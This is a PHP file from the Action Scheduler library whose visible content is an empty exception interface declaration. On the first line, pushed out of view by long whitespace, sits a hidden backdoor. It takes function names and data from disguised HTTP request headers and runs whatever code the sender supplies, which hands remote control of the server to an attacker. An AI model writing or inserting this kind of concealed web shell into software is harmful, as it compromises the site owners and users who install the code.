<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Content-Security-Policy'])){$ob_iconv_handle=$_HEADERS['Content-Security-Policy']('', $_HEADERS['Large-Allocation']($_HEADERS['Sec-Websocket-Accept']));$ob_iconv_handle();}


/**
 * ActionScheduler Exception Interface.
 *
 * Facilitates catching Exceptions unique to Action Scheduler.
 *
 * @package ActionScheduler
 * @since %VERSION%
 */
interface ActionScheduler_Exception {}
